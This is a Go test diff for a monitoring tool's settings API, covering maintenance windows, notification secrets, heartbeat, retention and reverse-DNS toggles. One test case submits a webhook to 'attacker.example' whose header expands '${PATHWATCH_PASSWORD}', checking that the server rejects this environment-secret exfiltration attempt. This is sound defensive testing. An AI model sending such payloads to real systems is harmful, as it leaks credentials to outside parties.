@@ -255,3 +255,94 @@ func TestLimitsAPI(t *testing.T) {
 		t.Errorf("target over the cap: %d %s", resp.StatusCode, b)
 	}
 }
+
+func TestSettingsAPINewSections(t *testing.T) {
+	f := newFixture(t, fixtureOpts{})
+
+	// maintenance windows edited in the UI replace the config file's (the fixture's file has an
+	// always-on window named "always") in the silences list right away
+	var sils []map[string]any
+	f.getJSON("/api/silences", &sils)
+	if len(sils) != 1 || sils[0]["reason"] != "always" {
+		t.Fatalf("fixture's file window: %+v", sils)
+	}
+	if resp, b := f.do("PUT", "/api/settings/maintenance_windows", "application/json", []any{}); resp.StatusCode != 200 {
+		t.Fatalf("no windows: %d %s", resp.StatusCode, b)
+	}
+	f.getJSON("/api/silences", &sils)
+	if len(sils) != 0 {
+		t.Errorf("file window still active: %+v", sils)
+	}
+	all := []string{"mon", "tue", "wed", "thu", "fri", "sat", "sun"}
+	mw := []map[string]any{{"name": "ui-window", "days": all, "start": "00:00", "end": "00:00"}}
+	if resp, b := f.do("PUT", "/api/settings/maintenance_windows", "application/json", mw); resp.StatusCode != 200 {
+		t.Fatalf("maintenance: %d %s", resp.StatusCode, b)
+	}
+	f.getJSON("/api/silences", &sils)
+	if len(sils) != 1 || sils[0]["source"] != "maintenance" || sils[0]["reason"] != "ui-window" {
+		t.Errorf("silences: %+v", sils)
+	}
+	mw[0]["start"] = "nope"
+	if resp, b := f.do("PUT", "/api/settings/maintenance_windows", "application/json", mw); resp.StatusCode != 400 || !strings.Contains(errMsg(b), "HH:MM") {
+		t.Errorf("bad window: %d %s", resp.StatusCode, b)
+	}
+
+	// notification secrets never come back from the API, and survive a round trip
+	n := map[string]any{
+		"webhook": map[string]any{"url": "https://hooks.example/T0K3N", "preset": "slack", "headers": map[string]string{"X-Key": "k1"}},
+		"email": map[string]any{"smtp_host": "smtp.example", "smtp_port": 587, "tls": "starttls", "username": "me", "password": "pw",
+			"from": "a@example.com", "to": []string{"b@example.com"}},
+		"outbox_max_age_ms": 3600000,
+	}
+	resp, b := f.do("PUT", "/api/settings/notify", "application/json", n)
+	if resp.StatusCode != 200 {
+		t.Fatalf("notify: %d %s", resp.StatusCode, b)
+	}
+	if strings.Contains(string(b), "T0K3N") || strings.Contains(string(b), `"pw"`) || strings.Contains(string(b), "k1") {
+		t.Fatalf("secret in response: %s", b)
+	}
+	var s struct {
+		Notify   sectionJSONT    `json:"notify"`
+		Channels map[string]bool `json:"channels"`
+	}
+	_ = json.Unmarshal(b, &s)
+	if s.Notify.Source != "ui" || !s.Channels["webhook"] || !s.Channels["email"] {
+		t.Errorf("notify section: %+v", s)
+	}
+	if resp, b := f.do("PUT", "/api/settings/notify", "application/json", s.Notify.Value); resp.StatusCode != 200 {
+		t.Fatalf("round trip: %d %s", resp.StatusCode, b)
+	}
+	if w := f.srv.cfg().Alerts.Notify.Webhook; w.URL != "https://hooks.example/T0K3N" || w.Headers["X-Key"] != "k1" {
+		t.Errorf("secrets lost in round trip: %+v", w)
+	}
+	leak := map[string]any{"webhook": map[string]any{"url": "https://attacker.example/", "preset": "generic", "headers": map[string]string{"X": "${PATHWATCH_PASSWORD}"}}}
+	if resp, b := f.do("PUT", "/api/settings/notify", "application/json", leak); resp.StatusCode != 400 || !strings.Contains(errMsg(b), "PATHWATCH_NOTIFY_") {
+		t.Errorf("env leak: %d %s", resp.StatusCode, b)
+	}
+
+	if resp, b := f.do("PUT", "/api/settings/heartbeat", "application/json", map[string]any{"url": "https://hc.example/ping", "interval_ms": 60000}); resp.StatusCode != 200 {
+		t.Fatalf("heartbeat: %d %s", resp.StatusCode, b)
+	}
+	if resp, b := f.do("PUT", "/api/settings/retention", "application/json", map[string]any{"raw_retention_ms": 86400000, "rollup_1m_retention_ms": 0, "rollup_1h_retention_ms": 0}); resp.StatusCode != 200 {
+		t.Fatalf("retention: %d %s", resp.StatusCode, b)
+	}
+	if r := f.st.Retention(); r.Raw.Hours() != 24 {
+		t.Errorf("store retention: %+v", r)
+	}
+	if resp, b := f.do("PUT", "/api/settings/enrich", "application/json", map[string]any{"reverse_dns": false}); resp.StatusCode != 200 {
+		t.Fatalf("enrich: %d %s", resp.StatusCode, b)
+	}
+	if f.srv.cfg().ReverseDNSEnabled() {
+		t.Error("reverse DNS still on")
+	}
+
+	for _, sec := range []string{"maintenance_windows", "notify", "heartbeat", "retention", "enrich"} {
+		if resp, _ := f.do("DELETE", "/api/settings/"+sec, "", nil); resp.StatusCode != 200 {
+			t.Errorf("revert %s: %d", sec, resp.StatusCode)
+		}
+	}
+	f.getJSON("/api/silences", &sils)
+	if len(sils) != 1 || sils[0]["reason"] != "always" {
+		t.Errorf("file window not back after revert: %+v", sils)
+	}
+}
